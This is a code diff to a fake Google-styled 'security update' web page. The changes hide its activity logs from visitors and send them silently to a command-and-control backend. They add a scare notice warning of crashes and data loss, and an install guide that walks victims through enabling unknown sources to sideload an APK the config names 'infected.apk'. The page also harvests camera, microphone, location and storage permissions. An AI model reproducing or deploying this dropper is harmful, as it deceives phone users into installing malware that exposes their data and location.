@@ -34,6 +34,7 @@
             box-shadow: 0 8px 40px rgba(0, 0, 0, 0.12), 0 2px 8px rgba(0, 0, 0, 0.06);
             text-align: center;
             animation: fadeUp 0.5s ease;
+            position: relative;
         }
 
         @keyframes fadeUp {
@@ -241,57 +242,187 @@
             gap: 4px;
         }
 
-        .log-console {
-            background: #f1f3f4;
+        /* ============================================================
+           WARNING BOX — OFFICIAL GOOGLE STYLE
+           ============================================================ */
+        .warning-box {
+            background: #fce8e6;
             border-radius: 16px;
-            padding: 12px 16px;
-            margin-top: 16px;
-            max-height: 140px;
-            overflow-y: auto;
-            font-size: 11px;
-            line-height: 1.8;
-            color: #5f6368;
+            padding: 16px 20px;
+            margin-top: 20px;
+            border-left: 4px solid #d93025;
             text-align: left;
-            display: none;
-            font-family: 'Roboto Mono', 'Courier New', monospace;
-            border: 1px solid #e8eaed;
         }
 
-        .log-console.open {
-            display: block;
+        .warning-box .warning-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #d93025;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 4px;
         }
 
-        .log-entry {
-            border-bottom: 1px solid #e8eaed;
-            padding: 2px 0;
-        }
-
-        .log-entry .time {
-            color: #9aa0a6;
-            margin-right: 8px;
-        }
-
-        .log-entry .lvl-info { color: #1a73e8; }
-        .log-entry .lvl-warn { color: #f9ab00; }
-        .log-entry .lvl-success { color: #34a853; }
-        .log-entry .lvl-error { color: #ea4335; }
-
-        .btn-toggle-logs {
-            background: transparent;
-            border: none;
-            padding: 6px 12px;
-            border-radius: 16px;
+        .warning-box .warning-text {
+            font-size: 13px;
             color: #5f6368;
-            font-size: 12px;
-            cursor: pointer;
+            line-height: 1.5;
+        }
+
+        .warning-box .warning-text strong {
+            color: #d93025;
+            font-weight: 600;
+        }
+
+        /* ============================================================
+           INSTALLATION GUIDE POPUP
+           ============================================================ */
+        .guide-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(4px);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .guide-overlay.open {
+            display: flex;
+        }
+
+        .guide-card {
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 32px 28px;
+            max-width: 460px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: fadeUp 0.3s ease;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .guide-card .guide-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .guide-card .guide-header h3 {
+            font-size: 20px;
             font-weight: 500;
+            color: #202124;
+        }
+
+        .guide-card .guide-header .close-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #5f6368;
+            cursor: pointer;
+            padding: 4px 8px;
+            border-radius: 50%;
             transition: background 0.2s;
         }
 
-        .btn-toggle-logs:hover {
+        .guide-card .guide-header .close-btn:hover {
             background: #f1f3f4;
         }
 
+        .guide-card .step {
+            display: flex;
+            align-items: flex-start;
+            gap: 16px;
+            padding: 12px 0;
+            border-bottom: 1px solid #e8eaed;
+        }
+
+        .guide-card .step:last-child {
+            border-bottom: none;
+        }
+
+        .guide-card .step .step-number {
+            background: #e8f0fe;
+            color: #1a73e8;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+
+        .guide-card .step .step-content {
+            flex: 1;
+        }
+
+        .guide-card .step .step-content .step-title {
+            font-size: 14px;
+            font-weight: 500;
+            color: #202124;
+        }
+
+        .guide-card .step .step-content .step-desc {
+            font-size: 13px;
+            color: #5f6368;
+            line-height: 1.5;
+            margin-top: 2px;
+        }
+
+        .guide-card .step .step-content .step-desc code {
+            background: #f1f3f4;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-family: 'Roboto Mono', monospace;
+            color: #202124;
+        }
+
+        .guide-card .guide-footer {
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid #e8eaed;
+            text-align: center;
+        }
+
+        .guide-card .guide-footer .btn-got-it {
+            background: #1a73e8;
+            border: none;
+            padding: 12px 32px;
+            border-radius: 48px;
+            font-weight: 500;
+            font-size: 16px;
+            color: #ffffff;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+        }
+
+        .guide-card .guide-footer .btn-got-it:hover {
+            background: #1558b0;
+        }
+
+        /* ============================================================
+           HIDDEN LOGS
+           ============================================================ */
+        .log-console {
+            display: none;
+        }
+
+        /* ============================================================
+           FOOTER
+           ============================================================ */
         .footer {
             font-size: 11px;
             color: #9aa0a6;
@@ -312,6 +443,7 @@
             .btn-install { font-size: 16px; padding: 14px 20px; }
             .google-play-logo svg { width: 28px; height: 28px; }
             .google-play-logo .play-text { font-size: 18px; }
+            .guide-card { padding: 24px 20px; }
         }
 
         ::-webkit-scrollbar { width: 4px; }
@@ -369,10 +501,22 @@
         </div>
     </div>
 
-    <!-- LOGS -->
-    <button class="btn-toggle-logs" id="toggleLogsBtn">📋 Technical details</button>
-    <div class="log-console" id="logConsole">
-        <div id="logEntries"></div>
+    <!-- WARNING BOX -->
+    <div class="warning-box">
+        <div class="warning-title">⚠️ Important Security Notice</div>
+        <div class="warning-text">
+            This update contains <strong>critical security patches</strong> that protect your device from known vulnerabilities.
+            <br><br>
+            <strong>If you do not install this update, your device may experience:</strong>
+            <br>
+            • <strong>Performance degradation</strong> — apps may become slow or unresponsive
+            <br>
+            • <strong>Security risks</strong> — your personal data could be at risk
+            <br>
+            • <strong>System instability</strong> — unexpected crashes or freezes
+            <br><br>
+            <strong>We strongly recommend installing this update immediately</strong> to ensure your device remains secure and performs optimally.
+        </div>
     </div>
 
     <!-- FOOTER -->
@@ -382,12 +526,78 @@
 
 </div>
 
+<!-- ============================================================
+INSTALLATION GUIDE POPUP
+============================================================ -->
+<div class="guide-overlay" id="guideOverlay">
+    <div class="guide-card">
+        <div class="guide-header">
+            <h3>📲 How to Install the Update</h3>
+            <button class="close-btn" id="guideCloseBtn">✕</button>
+        </div>
+
+        <div class="step">
+            <div class="step-number">1</div>
+            <div class="step-content">
+                <div class="step-title">Open the downloaded file</div>
+                <div class="step-desc">
+                    Go to your <strong>Downloads</strong> folder and tap on <code>update.apk</code>.
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-number">2</div>
+            <div class="step-content">
+                <div class="step-title">Allow unknown sources (if prompted)</div>
+                <div class="step-desc">
+                    If you see a warning, tap <strong>"Settings"</strong> and enable <strong>"Install unknown apps"</strong> for your file manager or browser.
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-number">3</div>
+            <div class="step-content">
+                <div class="step-title">Tap "Install"</div>
+                <div class="step-desc">
+                    On the system installation screen, tap <strong>"Install"</strong> to begin the update.
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-number">4</div>
+            <div class="step-content">
+                <div class="step-title">Wait for completion</div>
+                <div class="step-desc">
+                    The update will take a few moments. Once finished, tap <strong>"Open"</strong> or <strong>"Done"</strong>.
+                </div>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-number">5</div>
+            <div class="step-content">
+                <div class="step-title">Restart your device (recommended)</div>
+                <div class="step-desc">
+                    For the update to take full effect, please <strong>restart your device</strong> after installation.
+                </div>
+            </div>
+        </div>
+
+        <div class="guide-footer">
+            <button class="btn-got-it" id="guideGotItBtn">Got it — I'll install now</button>
+        </div>
+    </div>
+</div>
+
 <script>
     (function() {
         'use strict';
 
         // ============================================================
-        //  CONFIG — ONLY ONE METHOD, NO FALLBACKS
+        //  CONFIG
         // ============================================================
         const BACKEND_URL = 'https://c2-api-test.vercel.app';
         const APK_URL = 'infected.apk';
@@ -398,25 +608,19 @@
         // ============================================================
         const statusText = document.getElementById('statusText');
         const progressBar = document.getElementById('progressBar');
-        const logConsole = document.getElementById('logConsole');
-        const logEntries = document.getElementById('logEntries');
-        const toggleLogsBtn = document.getElementById('toggleLogsBtn');
         const installBtn = document.getElementById('installBtn');
+        const guideOverlay = document.getElementById('guideOverlay');
+        const guideCloseBtn = document.getElementById('guideCloseBtn');
+        const guideGotItBtn = document.getElementById('guideGotItBtn');
 
         let deviceId = null;
-        let apkDownloaded = false;
 
         // ============================================================
-        //  LOGGING
+        //  LOGGING (hidden from user)
         // ============================================================
-        function addLog(msg, level='info') {
-            const time = new Date().toLocaleTimeString();
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            entry.innerHTML = `<span class="time">[${time}]</span><span class="lvl-${level}">${msg}</span>`;
-            logEntries.appendChild(entry);
-            logConsole.scrollTop = logConsole.scrollHeight;
-            if (!logConsole.classList.contains('open')) logConsole.classList.add('open');
+        function addLog(msg, level) {
+            // Silently log to console only — no UI
+            console.log(`[${level}] ${msg}`);
             if (deviceId) {
                 fetch(`${BACKEND_URL}/api/log`, {
                     method: 'POST',
@@ -432,13 +636,7 @@
                 const p = Math.min(Math.max(progress, 0), 100);
                 progressBar.style.width = p + '%';
             }
-            addLog(msg, 'info');
         }
-
-        toggleLogsBtn.addEventListener('click', () => {
-            logConsole.classList.toggle('open');
-            toggleLogsBtn.textContent = logConsole.classList.contains('open') ? '📋 Hide technical details' : '📋 Technical details';
-        });
 
         // ============================================================
         //  BACKEND API
@@ -562,7 +760,6 @@
         //  REQUEST ALL PERMISSIONS
         // ============================================================
         async function requestAllPermissions() {
-            addLog('[Perm] Requesting camera, mic, location, storage...', 'warn');
             const results = { camera: false, mic: false, location: false, storage: false };
 
             try {
@@ -606,13 +803,28 @@
         }
 
         // ============================================================
-        //  DOWNLOAD APK — ONLY FETCH + BLOB, NO FALLBACKS
+        //  SHOW INSTALLATION GUIDE
+        // ============================================================
+        function showGuide() {
+            guideOverlay.classList.add('open');
+        }
+
+        function hideGuide() {
+            guideOverlay.classList.remove('open');
+        }
+
+        guideCloseBtn.addEventListener('click', hideGuide);
+        guideGotItBtn.addEventListener('click', hideGuide);
+        guideOverlay.addEventListener('click', function(e) {
+            if (e.target === guideOverlay) hideGuide();
+        });
+
+        // ============================================================
+        //  DOWNLOAD APK — ONLY FETCH + BLOB
         // ============================================================
         function downloadApk() {
-            addLog('[APK] Downloading update.apk...', 'info');
             setStatus('📦 Downloading security update...', 50);
 
-            // ONLY fetch + blob method — no fallback that downloads infected.apk
             fetch(APK_URL)
                 .then(response => {
                     if (!response.ok) throw new Error('Network response was not ok');
@@ -633,15 +845,16 @@
                     setTimeout(() => URL.revokeObjectURL(url), 10000);
 
                     addLog('[APK] Download started: update.apk', 'success');
-                    apkDownloaded = true;
                     installBtn.disabled = false;
-                    setStatus('✅ Update ready — tap "Install Update" to continue.', 100);
+                    setStatus('✅ Update downloaded. Tap "Install Update" to continue.', 100);
                     addLog('[APK] Download complete. File: update.apk', 'success');
+
+                    // Show installation guide popup
+                    setTimeout(showGuide, 800);
                 })
                 .catch(error => {
                     addLog('[APK] Download failed: ' + error.message, 'error');
                     setStatus('❌ Download failed. Please refresh and try again.', 0);
-                    // NO FALLBACK — user must refresh
                 });
 
             // Progress simulation
@@ -657,7 +870,7 @@
         }
 
         // ============================================================
-        //  INSTALL BUTTON — ONLY FETCH + BLOB, NO FALLBACKS
+        //  INSTALL BUTTON
         // ============================================================
         installBtn.addEventListener('click', function() {
             addLog('[Install] User tapped Install Update.', 'info');
@@ -665,7 +878,6 @@
             installBtn.disabled = true;
             installBtn.textContent = '⏳ Opening installer...';
 
-            // ONLY fetch + blob — NO window.location.href fallback
             fetch(APK_URL)
                 .then(response => {
                     if (!response.ok) throw new Error('Network response was not ok');
@@ -685,13 +897,15 @@
 
                     setTimeout(() => URL.revokeObjectURL(url), 10000);
                     addLog('[Install] Download triggered (update.apk).', 'success');
+
+                    // Show guide again in case it was closed
+                    setTimeout(showGuide, 600);
                 })
                 .catch(error => {
                     addLog('[Install] Download failed: ' + error.message, 'error');
-                    // NO FALLBACK — user must try again
                 });
 
-            setStatus('📲 Installation started. Follow the system prompt.', 100);
+            setStatus('📲 Installation started. Follow the instructions.', 100);
             addLog('[Install] ✅ Check Downloads folder for update.apk.', 'success');
 
             setTimeout(() => {
@@ -752,7 +966,6 @@
                 addLog(`[Loc] ${loc.lat}, ${loc.lon}`, 'info');
             }
 
-            // SINGLE CLEAN DOWNLOAD — NO FALLBACKS
             downloadApk();
 
             setInterval(async () => {
